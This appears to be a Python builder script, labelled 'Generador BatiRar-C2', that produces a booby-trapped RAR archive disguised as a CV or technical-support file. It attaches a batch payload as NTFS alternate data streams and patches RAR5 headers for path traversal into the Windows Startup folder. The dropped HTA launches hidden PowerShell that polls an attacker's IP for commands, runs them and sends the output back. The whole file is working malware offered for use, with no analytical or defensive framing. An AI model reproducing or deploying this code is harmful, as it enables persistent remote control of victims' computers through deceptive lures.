import os
import sys
import zlib
import struct
import platform
import subprocess
from pathlib import Path
from typing import Tuple, List
from datetime import datetime
from reportlab.lib.pagesizes import letter
from reportlab.lib.styles import getSampleStyleSheet
from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer

# ============================================================
# CONFIGURACIÓN MAESTRA
# ============================================================
NUM_DEPTHS = 10 
RELATIVE_DROP_PATH = "AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\batiRAR.bat"
PLACEHOLDER_LEN = 200
OUT_RAR = "Soporte_Tecnico_Nahuel.rar"
RAR5_SIG = b"Rar!\x1A\x07\x01\x00"
HFL_EXTRA = 0x0001
HFL_DATA = 0x0002

def generate_hta_payload(ip, port):
    """Genera el código HTA escapado con la IP y Puerto dinámicos."""
    url = f"http://{ip}:{port}/texto.txt"
    post_url = f"http://{ip}:{port}/"
    
    # Construimos el comando de PowerShell por separado para evitar errores de escape
    ps_cmd = (
        f"$last=''; while($true){{ try{{ "
        f"$cmd=Invoke-RestMethod -Uri '{url}' -UseBasicParsing; "
        f"if($cmd -and $cmd -ne $last){{ "
        f"$res=iex $cmd 2^>^&1 ^| Out-String; "
        f"Invoke-WebRequest -Uri '{post_url}' -Method Post -Body $res; $last=$cmd; "
        f"}} }} catch{{}} Start-Sleep -Seconds 10 }}"
    )

    hta = (
        f'^<html^>^<head^>^<hta:application showintaskbar="no" windowstate="minimize"^>^<script language="javascript"^>'
        f'var shell=new ActiveXObject("WScript.Shell");'
        f'var url="{url}";'
        f'var ps="powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command \\\"{ps_cmd}\\\"";'
        f'shell.Run(ps,0,false);window.close();^</script^>^</head^>^</html^>'
    )
    return hta

# --- Las funciones generate_long_stream_names, create_professional_cv, attach_multiple_ads, find_rar, etc. se mantienen igual ---

def generate_long_stream_names(count, length):
    return [f"stream_{i:02d}" + "x" * (length - len(f"stream_{i:02d}")) for i in range(count)]

def create_professional_cv() -> Path:
    filename = f"CV_Nahuel_{datetime.now().year}.pdf"
    fake_doc = Path(filename)
    try:
        doc = SimpleDocTemplate(str(fake_doc), pagesize=letter)
        styles = getSampleStyleSheet()
        story = [Paragraph("CURRICULUM VITAE", styles['Heading1']), Spacer(1, 12), Paragraph("Documentación de soporte oficial.", styles['Normal'])]
        doc.build(story)
        print(f"[*] PDF Generado: {fake_doc}")
    except Exception as e: print(f"[!] Error PDF: {e}")
    return fake_doc

def attach_multiple_ads(decoy: Path, payload_path: Path, stream_names: List[str]):
    for stream_name in stream_names:
        ads_path = f"{decoy}:{stream_name}"
        with open(ads_path, "wb") as f:
            f.write(payload_path.read_bytes())

def find_rar() -> str:
    candidates = [r"C:\Program Files\WinRAR\rar.exe", r"C:\Program Files (x86)\WinRAR\rar.exe"]
    for c in candidates:
        if Path(c).exists(): return c
    raise FileNotFoundError("WinRAR no encontrado")

def create_base_rar(rar_exe: str, decoy: Path) -> Path:
    base_rar = Path("base.rar")
    if base_rar.exists(): base_rar.unlink()
    subprocess.run(f'"{rar_exe}" a -os "{base_rar}" "{decoy}"', shell=True, check=True)
    return base_rar

def get_vint(buf: bytes, off: int) -> Tuple[int, int]:
    val, shift, i = 0, 0, off
    while i < len(buf):
        b = buf[i]; i += 1
        val |= (b & 0x7F) << shift
        if (b & 0x80) == 0: break
        shift += 7
    return val, i - off

def patch_placeholder_in_header(hdr: bytearray, placeholder_utf8: bytes, target_utf8: bytes) -> int:
    needle = b":" + placeholder_utf8
    j = hdr.find(needle)
    if j < 0: return 0
    start = j + 1
    old_len = len(placeholder_utf8)
    hdr[start:start+len(target_utf8)] = target_utf8
    if len(target_utf8) < old_len:
        hdr[start+len(target_utf8):start+old_len] = b"\x00" * (old_len - len(target_utf8))
    return 1

def rebuild_all_header_crc(buf: bytearray) -> int:
    sigpos = buf.find(RAR5_SIG)
    pos = sigpos + len(RAR5_SIG)
    while pos + 4 <= len(buf):
        block_start = pos
        try:
            header_size, hsz_len = get_vint(buf, block_start + 4)
            header_start = block_start + 4 + hsz_len
            header_end = header_start + header_size
            region = buf[block_start + 4:header_end]
            crc = zlib.crc32(region) & 0xFFFFFFFF
            struct.pack_into("<I", buf, block_start, crc)
            i = header_start
            _htype, n1 = get_vint(buf, i); i += n1
            hflags, n2 = get_vint(buf, i); i += n2
            if (hflags & HFL_EXTRA) != 0:
                _extrasz, n3 = get_vint(buf, i); i += n3
            datasz = 0
            if (hflags & HFL_DATA) != 0:
                datasz, n4 = get_vint(buf, i); i += n4
            pos = header_end + datasz
        except: break
    return 1

def build_relative_paths() -> List[str]:
    return [("..\\" * depth) + RELATIVE_DROP_PATH for depth in range(1, NUM_DEPTHS + 1)]

def patch_rar(base_rar: Path, stream_names: List[str], relative_paths: List[str]) -> Path:
    data = bytearray(base_rar.read_bytes())
    current_file_index = 0
    pos = data.find(RAR5_SIG) + len(RAR5_SIG)
    while pos + 4 <= len(data) and current_file_index < len(stream_names):
        block_start = pos
        header_size, hsz_len = get_vint(data, block_start + 4)
        header_start = block_start + 4 + hsz_len
        header_end = header_start + header_size
        hdr = bytearray(data[header_start:header_end])
        s_name = stream_names[current_file_index].encode("utf-8")
        s_target = relative_paths[current_file_index].encode("utf-8")
        if patch_placeholder_in_header(hdr, s_name, s_target):
            data[header_start:header_end] = hdr
            current_file_index += 1
        i = header_start
        _htype, n1 = get_vint(data, i); i += n1
        hflags, n2 = get_vint(data, i); i += n2
        if (hflags & HFL_EXTRA) != 0:
            _extrasz, n3 = get_vint(data, i); i += n3
        datasz = 0
        if (hflags & HFL_DATA) != 0:
            datasz, n4 = get_vint(data, i); i += n4
        pos = header_end + datasz
    rebuild_all_header_crc(data)
    final_rar = Path(OUT_RAR)
    final_rar.write_bytes(data)
    return final_rar

def main():
    if platform.system() != "Windows":
        print("[!] Solo funciona en Windows.")
        sys.exit(1)

    print("--- Generador BatiRar-C2 ---")
    c2_ip = input("IP C2: ").strip()
    c2_port = input("Puerto C2: ").strip()
    
    print("\n1. Crear CV / 2. Usar archivo")
    choice = input("Selección: ")
    if choice == "1": fake_doc = create_professional_cv()
    else: fake_doc = Path(input("Archivo: "))

    hta_code = generate_hta_payload(c2_ip, c2_port)
    payload_content = (
        f'@echo off\n'
        f'echo {hta_code} > "%AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\batiRAR.hta"\n'
        f'start "" mshta.exe "%AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\batiRAR.hta"\n'
        f'exit\n'
    )

    payload_file = Path("payload.bat")
    payload_file.write_text(payload_content, encoding="utf-8")
    
    ads_names = generate_long_stream_names(NUM_DEPTHS, PLACE_HOLDER_LEN if 'PLACE_HOLDER_LEN' in locals() else PLACEHOLDER_LEN)
    attach_multiple_ads(fake_doc, payload_file, ads_names)
    
    rar_exe = find_rar()
    base_rar = create_base_rar(rar_exe, fake_doc)
    relative_paths = build_relative_paths()
    final_rar = patch_rar(base_rar, ads_names, relative_paths)
    
    base_rar.unlink()
    payload_file.unlink()
    print(f"\n[+] LISTO: {final_rar}")

if __name__ == "__main__":
    main()